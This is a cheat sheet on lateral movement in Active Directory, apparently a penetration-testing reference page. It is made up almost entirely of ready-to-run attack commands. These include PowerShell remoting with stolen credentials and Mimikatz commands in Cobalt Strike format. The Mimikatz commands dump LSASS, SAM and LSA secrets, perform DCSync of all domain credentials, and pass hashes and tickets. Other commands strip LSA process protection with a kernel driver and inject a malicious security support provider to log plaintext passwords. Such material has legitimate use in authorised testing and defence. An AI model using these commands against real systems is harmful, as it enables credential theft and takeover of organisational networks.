# Active Directory Lateral Movement

## Lateral Movement

### Powershell Remoting

Enable Powershell Remoting on current Machine \(Needs Admin Access\)

```text
Enable-PSRemoting
```

Entering or Starting a new PSSession \(Needs Admin Access\)

```text
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

### Remote Code Execution with PS Credentials

```text
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

#### Import a PowerShell module and execute its functions remotely

Execute the command and start a session

```text
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
```

Interact with the session

```text
Enter-PSSession -Session $sess
```

#### Executing Remote Stateful commands

Create a new session

```text
$sess = New-PSSession -ComputerName <NameOfComputer>
```

Execute command on the session

```text
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
```

Check the result of the command to confirm we have an interactive session

```text
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Mimikatz

These commands are in cobalt strike format!

Dump LSASS:

```text
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords
```

\(Over\) Pass The Hash

```text
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
```

List all available kerberos tickets in memory

```text
mimikatz sekurlsa::tickets
```

Dump local Terminal Services credentials

```text
mimikatz sekurlsa::tspkg
```

Dump and save LSASS in a file

```text
mimikatz sekurlsa::minidump c:\temp\lsass.dmp
```

List cached MasterKeys

```text
mimikatz sekurlsa::dpapi
```

List local Kerberos AES Keys

```text
mimikatz sekurlsa::ekeys
```

Dump SAM Database

```text
mimikatz lsadump::sam
```

Dump SECRETS Database

```text
mimikatz lsadump::secrets
```

Inject and dump the Domain Controler's Credentials

```text
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject
```

Dump the Domain's Credentials without touching DC's LSASS and also remotely

```text
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
```

List and Dump local kerberos credentials

```text
mimikatz kerberos::list /dump
```

Pass The Ticket

```text
mimikatz kerberos::ptt <PathToKirbiFile>
```

List TS/RDP sessions

```text
mimikatz ts::sessions
```

List Vault credentials

```text
mimikatz vault::list
```

What if mimikatz fails to dump credentials because of LSA Protection controls? 

* LSA as a Protected Process \(Kernel Land Bypass\)

Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1

```text
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

Next upload the mimidriver.sys from the official mimikatz repo to the same folder of your mimikatz.exe Now let's import the mimidriver.sys to the system

```text
mimikatz # !+
```

Now let's remove the protection flags from lsass.exe process

```text
mimikatz # !processprotect /process:lsass.exe /remove
```

Finally, run the logon passwords function to dump lsass

```text
mimikatz # sekurlsa::logonpasswords
```

* LSA as a Protected Process \(Userland Land "Fileless" Bypass\)
  * [PPLdump](https://github.com/itm4n/PPLdump)
  * [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
* LSA is running as virtualized process \(LSAISO\) by Credential Guard

Check if a process called lsaiso.exe exists on the running processes

```text
tasklist |findstr lsaiso
```

If it does there isn't a way to dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data. Let's inject our own malicious Security Support Provider into memory, for this example, I'll use the one Mimikatz provides

```text
mimikatz # misc::memssp
```

Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log

* [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
* [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

#### Useful Tools

* [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward 

  capabilities.

* [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
* [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
* [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe

## References

This was extracted from here:

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md\#lateral-movement" %}



